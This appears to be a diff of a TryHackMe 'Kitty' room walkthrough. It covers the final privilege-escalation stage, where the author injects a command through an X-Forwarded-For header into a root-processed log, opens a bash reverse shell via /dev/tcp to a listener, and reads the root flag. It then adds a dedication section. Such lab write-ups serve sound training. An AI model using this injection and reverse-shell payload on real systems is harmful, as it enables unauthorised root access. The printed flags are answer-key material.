@@ -25,7 +25,7 @@ Whenever you are ready, click on the Start Machine button to fire up the Virtual
 <code>THM{581bfc26b53f2e167a05613eecf039bb}</code></p>
 
 <br>
-
+<br>
 
 <h3>Nmap</h3>
 
@@ -457,7 +457,7 @@ done < /var/www/development/logged
 cat /dev/null > /var/www/development/logged
 ```
 
-
+```bash
 kitty@ip-10-201-19-107:/var/www/development$ apache2ctl -S
 VirtualHost configuration:
 127.0.0.1:8080         localhost (/etc/apache2/sites-enabled/dev_site.conf:2)
@@ -473,11 +473,11 @@ Define: DUMP_VHOSTS
 Define: DUMP_RUN_CFG
 User: name="www-data" id=33 not_used
 Group: name="www-data" id=33 not_used
+```
 
 
 
-
-
+```bash
 kitty@ip-10-201-19-107:/etc/apache2/sites-enabled$ cat dev_site.conf
 Listen 127.0.0.1:8080
 <VirtualHost 127.0.0.1:8080>
@@ -511,14 +511,13 @@ Listen 127.0.0.1:8080
 </VirtualHost>
 
 # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+```
 
 
-
-
-
+```bash
 kitty@ip-10-201-19-107:/$ diff /var/www/html /var/www/development
 diff /var/www/html/config.php /var/www/development/config.php
-7c7
+
 < define('DB_NAME', 'mywebsite');
 ---
 > define('DB_NAME', 'devsite');
@@ -539,23 +538,27 @@ diff /var/www/html/index.php /var/www/development/index.php
 ---
 >         <h2>Development User Login</h2>
 Only in /var/www/development: logged
+```
 
 
-
-
+```bash
  curl -s 'http://127.0.0.1:8080/index.php' -X POST -d 'username=lulu&password=password' -H 'X-Forwarded-For: test'
 
 SQL Injection detected. This incident will be logged!
+```
+
+```bash
 kitty@kitty:/var/www/development$ cat logged
 test
+```
 
-
+```bash
 kitty@ip-10-201-19-107:/var/www/development$ curl http://127.0.0.1:8080/index.php -X POST -d 'username=0x&password=test' -H 'X-Forwarded-For:;bash -c "/bin/bash -i >& /dev/tcp/10.201.109.144/6666 0>&1"'
 
 SQL Injection detected. This incident will be logged!kitty@ip-10-201-19-107:/var/www/development$ 
+```
 
-
-
+```bash
 :~/Kitty# nc -nlvp 6666
 Listening on 0.0.0.0 6666
 Connection received on 10.201.19.107 39000
@@ -575,14 +578,60 @@ snap
 root@ip-10-201-19-107:~# cat root.txt
 cat root.txt
 THM{581bfc26b53f2e167a05613eecf039bb}
-root@ip-10-201-19-107:~# 
+```
 
 <br>
 <br>
 
-<img width="1915" height="890" alt="image" src="https://github.com/user-attachments/assets/de7a8d3d-7921-43d3-b40b-c6173eb97aed" />
+<h2>Task 2 . Thank you</h2>
+<p>This room is dedicated to my brother's cat, whose name was Kitty.</p>
 
-<img width="1907" height="900" alt="image" src="https://github.com/user-attachments/assets/c46df186-4258-4562-9ca5-2568274c72f9" />
+<br>
 
+<p align="center" ><img width="300px" src="https://github.com/user-attachments/assets/ab4d22d8-9344-4888-85d3-836b502bc32f"></p>
+
+<br>
+
+<p>Sadly, she passed away on October 4th, 2022. She was a part of our family for 13 years, and we miss her very much.</p>
+
+<br>
+
+<p align="center" ><img width="300px" src="https://github.com/user-attachments/assets/a110cc75-658e-4bf5-b77a-61bc873ebe53"></p>
+
+<br>
+
+<p>I hope you enjoyed the room!</p>
+
+<p><em>Answer the question below</em></p>
+
+<p>2.1. Thank you for playing.<br>
+<code>No answer needed</code></p>
+
+
+<br>
+<br>
+
+<h1>Completed</h1>
+
+<img width="1895" height="928" alt="image" src="https://github.com/user-attachments/assets/de7a8d3d-7921-43d3-b40b-c6173eb97aed" />
+
+<br>
+
+<img width="1879" height="932" alt="image" src="https://github.com/user-attachments/assets/c46df186-4258-4562-9ca5-2568274c72f" />
+
+
+<br>
+
+<h1 align="center">My TryHackMe Journey</h1>
+
+<div align="center">
+
+| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
+| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
+|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
+| 2025, August 17   |   468    |     120ᵗʰ    |      5ᵗʰ     |     328ᵗʰ   |     6ᵗʰ    | 121,636  |    920    |    73     |
+
+
+</div>
 
 
